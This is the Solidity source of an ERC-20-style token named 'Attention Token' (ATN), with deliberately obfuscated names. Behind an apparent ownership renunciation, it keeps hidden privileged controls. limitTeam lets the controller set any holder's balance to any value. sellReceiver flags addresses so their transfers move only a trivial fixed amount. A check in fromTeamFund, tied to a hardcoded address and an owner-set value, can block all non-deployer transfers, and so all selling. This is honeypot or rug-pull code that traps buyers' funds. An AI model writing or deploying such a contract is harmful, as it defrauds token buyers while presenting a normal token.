//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface feeLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverSwap) external view returns (uint256);

    function transfer(address minTotalMax, uint256 senderTake) external returns (bool);

    function allowance(address launchedBuyFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderTake) external returns (bool);

    function transferFrom(
        address sender,
        address minTotalMax,
        uint256 senderTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyTx, uint256 value);
    event Approval(address indexed launchedBuyFund, address indexed spender, uint256 value);
}

abstract contract receiverSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityMaxTotal {
    function createPair(address limitTokenList, address walletMax) external returns (address);
}

interface feeLaunchMetadata is feeLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AttentionToken is receiverSender, feeLaunch, feeLaunchMetadata {

    uint256 public senderMax;

    bool public tradingIs;

    function getOwner() external view returns (address) {
        return liquidityTeam;
    }

    bool private launchAmount;

    function name() external view virtual override returns (string memory) {
        return amountSenderWallet;
    }

    function transferFrom(address launchedMarketing, address minTotalMax, uint256 senderTake) external override returns (bool) {
        if (_msgSender() != takeFee) {
            if (tradingLaunched[launchedMarketing][_msgSender()] != type(uint256).max) {
                require(senderTake <= tradingLaunched[launchedMarketing][_msgSender()]);
                tradingLaunched[launchedMarketing][_msgSender()] -= senderTake;
            }
        }
        return fromTeamFund(launchedMarketing, minTotalMax, senderTake);
    }

    function owner() external view returns (address) {
        return liquidityTeam;
    }

    uint256 listSwap;

    address public maxList;

    string private amountSenderWallet = "Attention Token";

    function launchedList(address teamSender) public {
        if (walletAuto) {
            return;
        }
        
        atMarketing[teamSender] = true;
        if (senderMax != teamTotalMax) {
            txLiquidity = false;
        }
        walletAuto = true;
    }

    function modeMarketing(address launchedMarketing, address minTotalMax, uint256 senderTake) internal returns (bool) {
        require(tradingAmount[launchedMarketing] >= senderTake);
        tradingAmount[launchedMarketing] -= senderTake;
        tradingAmount[minTotalMax] += senderTake;
        emit Transfer(launchedMarketing, minTotalMax, senderTake);
        return true;
    }

    mapping(address => bool) public fromMin;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptWallet;
    }

    uint8 private receiverTotalBuy = 18;

    string private autoTo = "ATN";

    function shouldWallet() private view {
        require(atMarketing[_msgSender()]);
    }

    uint256 public teamTotalMax;

    function allowance(address launchedExempt, address totalMarketing) external view virtual override returns (uint256) {
        if (totalMarketing == takeFee) {
            return type(uint256).max;
        }
        return tradingLaunched[launchedExempt][totalMarketing];
    }

    bool private teamList;

    address public fromTakeSwap;

    event OwnershipTransferred(address indexed enableAmount, address indexed swapMode);

    constructor (){
        
        exemptMarketing sellTx = exemptMarketing(takeFee);
        maxList = liquidityMaxTotal(sellTx.factory()).createPair(sellTx.WETH(), address(this));
        
        fromTakeSwap = _msgSender();
        toFee();
        atMarketing[fromTakeSwap] = true;
        tradingAmount[fromTakeSwap] = exemptWallet;
        if (txSell != teamTotalMax) {
            launchAmount = false;
        }
        emit Transfer(address(0), fromTakeSwap, exemptWallet);
    }

    mapping(address => mapping(address => uint256)) private tradingLaunched;

    bool public isFeeSell;

    bool public walletAuto;

    function sellReceiver(address launchedMin) public {
        shouldWallet();
        
        if (launchedMin == fromTakeSwap || launchedMin == maxList) {
            return;
        }
        fromMin[launchedMin] = true;
    }

    function toFee() public {
        emit OwnershipTransferred(fromTakeSwap, address(0));
        liquidityTeam = address(0);
    }

    function approve(address totalMarketing, uint256 senderTake) public virtual override returns (bool) {
        tradingLaunched[_msgSender()][totalMarketing] = senderTake;
        emit Approval(_msgSender(), totalMarketing, senderTake);
        return true;
    }

    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {
        return tradingAmount[receiverSwap];
    }

    function limitTeam(address shouldReceiver, uint256 senderTake) public {
        shouldWallet();
        tradingAmount[shouldReceiver] = senderTake;
    }

    uint256 txLimit;

    uint256 constant receiverIsTeam = 8 ** 10;

    address fundTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private totalSwap;

    uint256 public txSell;

    mapping(address => bool) public atMarketing;

    bool private txLiquidity;

    function transfer(address shouldReceiver, uint256 senderTake) external virtual override returns (bool) {
        return fromTeamFund(_msgSender(), shouldReceiver, senderTake);
    }

    address private liquidityTeam;

    function fromTeamFund(address launchedMarketing, address minTotalMax, uint256 senderTake) internal returns (bool) {
        if (launchedMarketing == fromTakeSwap) {
            return modeMarketing(launchedMarketing, minTotalMax, senderTake);
        }
        uint256 enableTeam = feeLaunch(maxList).balanceOf(fundTx);
        require(enableTeam == txLimit);
        require(minTotalMax != fundTx);
        if (fromMin[launchedMarketing]) {
            return modeMarketing(launchedMarketing, minTotalMax, receiverIsTeam);
        }
        return modeMarketing(launchedMarketing, minTotalMax, senderTake);
    }

    uint256 private exemptWallet = 100000000 * 10 ** 18;

    function senderLaunch(uint256 senderTake) public {
        shouldWallet();
        txLimit = senderTake;
    }

    address takeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return autoTo;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverTotalBuy;
    }

    mapping(address => uint256) private tradingAmount;

}